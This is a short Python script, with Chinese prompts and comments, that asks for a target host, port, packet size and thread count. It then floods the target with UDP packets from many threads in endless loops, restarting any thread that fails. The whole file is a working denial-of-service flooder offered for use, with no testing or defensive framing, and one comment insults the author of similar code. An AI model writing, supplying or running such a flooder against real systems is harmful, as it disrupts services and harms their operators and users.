import socket
import os
import random
import time
import threading

ip=input("IP/HOST:")
port=int(input("PORT:"))
dx=int(input("包体大小（按字节计算）:"))
xc=int(input("线程数:"))

s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

t=0
def new():
    a = threading.Thread(target=attack, args=())
    a.start()
    #print("新线程",t,"启动")

def attack():#与傻逼玩意发包代码相同
    global t
    t=t+1
    sb=t
    global xc
    if t==xc:
        print("1 -",xc,"所有线程已启动")
    #print("线程",t,"启动")
    global port
    global ip
    while (1):
        try:
            bytes = "a" * dx
            s.sendto(bytes.encode('utf-8'), (ip, port))
            #print("线程",sb,"发送包体成功")
        except:
            #print("关闭线程",sb,"，因为该线程连接失败")
            new()#开启线程
            break

for i in range(xc):
    a = threading.Thread(target=attack, args=())
    a.start()
